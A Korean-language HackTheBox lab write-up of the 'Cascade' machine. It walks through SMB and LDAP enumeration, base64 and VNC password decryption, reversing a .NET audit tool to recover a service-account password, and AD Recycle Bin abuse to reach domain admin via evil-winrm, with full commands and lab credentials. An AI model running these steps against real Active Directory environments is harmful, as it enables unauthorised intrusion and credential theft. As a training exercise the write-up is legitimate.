# Cascade - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,3268,3269,389,445,49154,49155,49157,49158,49165,53,5985,636,88 -sC -sV -vv -oA Cascade 10.129.19.146
```
<img width="1105" height="478" alt="image" src="https://github.com/user-attachments/assets/70b29d42-8850-4c63-8708-d3e4715f3531" />

- KERBEROS(88)
- LDAP(389)
- SMB(445)
- WINRM(5985)

<br>

- `/etc/hosts`에 `cascade.local` 추가.
<img width="1103" height="67" alt="image" src="https://github.com/user-attachments/assets/a51c7491-7409-4f3f-acd8-2fb98976fc2e" />

---
## SMB
- `nxc`를 사용하여 유저 목록 수집.
```bash
nxc smb 10.129.19.146 -u '' -p '' --users
```
<img width="1103" height="466" alt="image" src="https://github.com/user-attachments/assets/d29182e7-632f-4338-b8f2-05e419cfcb4d" />

<br>
<br>

- `administrator` 추가하여 유저 목록 생성.
<img width="1103" height="354" alt="image" src="https://github.com/user-attachments/assets/f6b6adc2-a9e1-42f1-aa65-5caf8fae78b1" />

## LDAP
- `ldapsearch`를 사용하여 정보 수집.
- 데이터가 많아서 파일로 생성.
```bash
ldapsearch -v -x -b "DC=cascade,DC=local" -H "ldap://10.129.19.146" "(objectclass=*)" > ldap_dump
```
<img width="1103" height="107" alt="image" src="https://github.com/user-attachments/assets/ddea026d-c6dc-4987-9747-981c8f7ef740" />

<br>
<br>

- 수집된 정보 중 특별한 정보가 있는지 확인.
- `cascadeLegacyPwd` 발견.
```bash
cat ldap_dump|awk '{print $1}'|sort|uniq -c|sort -nr
```
<img width="1103" height="98" alt="image" src="https://github.com/user-attachments/assets/50ad20e0-3c21-49e6-b795-2619b88a79af" />

<br>
<br>

- `r.thompson`유저의 비밀번호로 확인.
<img width="1103" height="576" alt="image" src="https://github.com/user-attachments/assets/5ae4b8f3-4797-4a3e-9c7c-2c59e9567069" />

<br>
<br>

- `r.thompson:clk0bjVldmE=`로 로그인 시도하였으나 실패.
<img width="1103" height="123" alt="image" src="https://github.com/user-attachments/assets/750fc8d7-36b8-42bc-a088-1532a97e9ae0" />

<br>
<br>

- `base64` 인코딩처럼 보여 디코딩.
- `r.thompson:rY4n5eva` 로그인 성공.
```bash
nxc smb 10.129.19.146 -u r.thompson -p rY4n5eva
```
<img width="1103" height="113" alt="image" src="https://github.com/user-attachments/assets/7bbd1c76-726c-437b-820e-12ae0595ea06" />

---
## VNC Decrypt
- `c:\shares` 내부 확인 불가.
- `SMB` 폴더 수집.
```bash
smbmap -u r.thompson -p 'rY4n5eva' -H 10.129.19.146
```
<img width="1103" height="222" alt="image" src="https://github.com/user-attachments/assets/d0eb8125-b409-4ab9-8085-f6b9a0900b23" />

<br>
<br>

- 다운로드 가능한 파일 다운로드.
```
smbclient -U r.thompson //10.129.19.146/Data rY4n5eva

smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```
<img width="1103" height="366" alt="image" src="https://github.com/user-attachments/assets/d9b0f60b-6777-4cd1-8921-ff3e6f4d63e8" />

<br>
<br>

- `/IT/Temp/s.smith`에서 레지스트리 파일 발견.
<img width="1103" height="131" alt="image" src="https://github.com/user-attachments/assets/d309d219-83f1-4070-8ac9-1c98d237ae5c" />

<br>
<br>

- `hex`코드로 되어 있는 비밀번호 발견.
<img width="1103" height="117" alt="image" src="https://github.com/user-attachments/assets/a943c3cc-fbd0-42cf-a571-fcc7275ed483" />

<br>
<br>

- https://github.com/frizb/PasswordDecrypts
- 디코딩 진행.
```bash
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```
<img width="1103" height="117" alt="image" src="https://github.com/user-attachments/assets/3d60654b-7148-4f2a-be93-e659d8b8577d" />

<br>
<br>

- 유저목록으로 로그인 테스트.
```bash
nxc smb 10.129.19.146 -u users -p sT333ve2
```
<img width="1103" height="185" alt="image" src="https://github.com/user-attachments/assets/160584dc-ae52-4e8e-8516-6f761208492a" />

<br>
<br>

- `s.smith:sT333ve2`로 `WINRM`로그인 시도하여 성공.
```bash
nxc winrm 10.129.19.146 -u s.smith -p sT333ve2
```
<img width="1103" height="168" alt="image" src="https://github.com/user-attachments/assets/e447a165-709e-4439-a16c-dc9ce00e6622" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.19.146 -u s.smith -p sT333ve2
```
<img width="1103" height="272" alt="image" src="https://github.com/user-attachments/assets/c3a024aa-6b17-4c25-986d-8c0f7f3e62f7" />

---
## Reversing
- `c:\shares` 내부를 확인하려 했으나 실패.
<img width="1006" height="171" alt="image" src="https://github.com/user-attachments/assets/749f7eeb-1761-4118-8d6f-8f484fdd1fc6" />

<br>
<br>

- `Audit Share` 그룹에 속해 있음.
```powershell
net user s.smith
```
<img width="1006" height="524" alt="image" src="https://github.com/user-attachments/assets/38469609-09e7-4245-bd1d-7d9c06b52bda" />

<br>
<br>

- `smbmap`으로는 내부 폴더 확인 가능.
```bash
smbmap -u s.smith -p sT333ve2 -H 10.129.19.214
```
<img width="1006" height="220" alt="image" src="https://github.com/user-attachments/assets/54ee1330-81d4-446d-b21e-67aab7cff627" />

<br>
<br>

- 폴더 내부 파일 다운로드.
```
smbclient -U s.smith //10.129.19.214/Audit$

smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```
<img width="1006" height="462" alt="image" src="https://github.com/user-attachments/assets/fe79e7cc-fbdd-4eec-b7a7-b1e4cb46e7fc" />

<br>
<br>

- `/DB`에서 `Audit.db` 발견.
<img width="1006" height="164" alt="image" src="https://github.com/user-attachments/assets/cd845395-5b28-4ebf-96c1-29e4aa66e45b" />

<br>
<br>

- 덤핑해서 `ArkSvc`의 계정 발견.
```bash
sqlite3 Audit.db .dump
```
<img width="1006" height="310" alt="image" src="https://github.com/user-attachments/assets/abb15f28-ffee-443c-ad0d-8253b08250fc" />

<br>
<br>

- 해당 비밀번호로 로그인 시도하였으나 실패.
- `base64`로 디코딩한 비밀번호도 시도하였으나 실패.
- `RunAudit.bat`파일에서 `CascAudit.exe`를 실행하는 것을 발견.
<img width="1006" height="69" alt="image" src="https://github.com/user-attachments/assets/83110153-d1fc-497c-b301-942ee4218fa2" />

<br>
<br>

- 윈도우 가상 머신에 `audit` 폴더 압축하여 전달.
<img width="1079" height="863" alt="image" src="https://github.com/user-attachments/assets/f1b64670-584d-4ea5-88f4-b9b416aa579b" />

<br>
<br>

- `DNSpy`를 사용하여 리버싱을 진행.
- `sqlite db`인자를 받은 상태에서 암호화된 비밀번호를 디코딩을 하는 코드 발견.
<img width="1079" height="863" alt="image" src="https://github.com/user-attachments/assets/2adb8319-3c47-4555-b445-238a483ff757" />

<br>
<br>

- `sqlite` 연결이 끝나는 지점에 `Audit.db`의 경로를 인자로 넣고 브레이크를 걸어서 디버깅 시도.
<img width="1079" height="863" alt="image" src="https://github.com/user-attachments/assets/43879528-f37f-4ce1-9d59-61edc626f8ea" />

<br>
<br>

- `ArkSvc:w3lc0meFr31nd` 계정 획득.
<img width="1079" height="863" alt="image" src="https://github.com/user-attachments/assets/48006605-c0bf-4cf4-a918-2596e3f99a7e" />

<br>
<br>

- `winrm` 로그인 시도.
```bash
nxc winrm 10.129.19.214 -u ArkSvc -p w3lc0meFr31nd
```
<img width="1006" height="179" alt="image" src="https://github.com/user-attachments/assets/4eaa30e4-0ee5-41c1-b3a7-b0a5d0c6afab" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.19.214 -u ArkSvc -p w3lc0meFr31nd
```
<img width="1006" height="272" alt="image" src="https://github.com/user-attachments/assets/e8278475-2cdf-4397-bed3-02ffe09b20e8" />

---
## Privesc
- `AD Recycle Bin` 그룹에 속해 있음.
```powershell
whoami /all
```
<img width="1006" height="213" alt="image" src="https://github.com/user-attachments/assets/297a4e51-a840-45fe-9892-dcea9449c027" />

<br>
<br>

- https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=ad%20recycle%20bin#ad-recycle-bin
- `TempAdmin`의 비밀번호 발견.
```powershell
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
<img width="1006" height="163" alt="image" src="https://github.com/user-attachments/assets/e69a2e34-1b7d-4df2-bb09-32542ae32353" />

<br>
<br>

- `base64`로 인코딩 된 것처럼 보여 디코딩.
```bash
echo -n 'YmFDVDNyMWFOMDBkbGVz'|base64 -d
```
<img width="1006" height="68" alt="image" src="https://github.com/user-attachments/assets/b369662f-eda3-4b33-9e77-8a6266aa7e65" />

<br>
<br>

- `administrator`로 로그인 가능.
```bash
nxc winrm 10.129.19.214 -u users -p 'baCT3r1aN00dles'
```
<img width="1006" height="201" alt="image" src="https://github.com/user-attachments/assets/e0aff530-c878-4bc2-8518-a192d1574915" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.19.214 -u administrator -p baCT3r1aN00dles
```
<img width="1006" height="273" alt="image" src="https://github.com/user-attachments/assets/18212a0b-2fc3-41d6-a9d8-9bde6b3e9c0c" />

---
## FLAG
- `c:\users\s.smith\desktop\user.txt`
<img width="1002" height="201" alt="image" src="https://github.com/user-attachments/assets/831fb18b-2fce-4b8d-a7c6-7e4d28cc7c45" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1002" height="180" alt="image" src="https://github.com/user-attachments/assets/2710e576-2090-460f-b528-75397c3ff1d1" />
